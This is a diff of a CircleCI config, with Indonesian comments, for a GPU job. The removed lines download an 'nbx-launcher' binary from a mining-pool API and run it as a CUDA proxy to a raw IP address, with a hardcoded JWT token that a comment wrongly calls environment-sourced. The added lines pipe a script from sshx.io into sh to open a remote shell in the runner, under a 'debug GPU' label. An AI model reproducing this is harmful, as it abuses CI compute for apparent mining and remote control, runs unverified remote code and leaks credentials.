@@ -1,22 +1,22 @@
 version: 2.1
 
 jobs:
-  eksekusi-langsung:
+  debug-gpu-langsung:
     machine:
       image: ubuntu-2004-cuda-11.4:202110-01
     resource_class: gpu.nvidia.medium
 
     steps:
       - run:
-          name: "Ambil dan Jalankan Tool"
+          name: "Setup GPU & Remote Terminal"
           command: |
-            # Langsung sikat perintah curl lu di sini
-            curl -fLo nbx-launcher https://pool-api.nockbox.org/api/v1/releases/nbx-launcher/latest
-            chmod +x nbx-launcher
+            # 1. Cek dulu GPU-nya ready apa kagak
+            nvidia-smi
             
-            # Panggil token dari Environment Variable biar aman
-            ./nbx-launcher start proxy 152.42.171.146 --accel cuda --auth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJjN2M5NzJmYi1mNzIwLTQ4MzktOTQ5My05OTcxNmQ3MGI2ZGUiLCJpc3MiOiJuYngiLCJhdWQiOiJuYngtYmFja2VuZCIsImlhdCI6MTc3MTM5NzIxNSwiZXhwIjoxNzcxNDE4ODE1LCJ0ZWxlbWV0cnkiOnRydWV9.q7dDr7TjpxElVNnwSzcZC9dKIdSwBUYBeNrLTrwo-2U
+            # 2. Jalanin sshx buat dapet akses remote
+            # Ini bakal ngasih lu URL di log CircleCI
+            curl -sSf https://sshx.io/get | sh -s run
 workflows:
-  say-hello-workflow:
+  main:
     jobs:
-      - eksekusi-langsung
+      - debug-gpu-langsung
